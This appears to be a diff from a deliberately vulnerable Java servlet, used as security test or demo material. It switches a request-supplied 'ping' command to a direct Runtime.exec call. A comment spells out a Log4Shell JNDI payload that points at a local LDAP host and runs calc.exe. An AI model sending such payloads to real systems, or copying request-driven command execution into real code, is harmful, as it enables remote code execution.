@@ -36,7 +36,7 @@ public class Servlet extends HttpServlet {
             // Only ping IP address allowed, any other command will be audited
             final Pattern pattern = Pattern.compile("^ping \\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$");
             if (pattern.matcher(cmd).matches()) {
-                Exec.run(cmd);
+                Runtime.getRuntime().exec(cmd);
             } else {
                 // CVE-2021-44228 (RCE) may be exploited using
                 // cmd that equals ${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/Y2FsYy5leGU=}
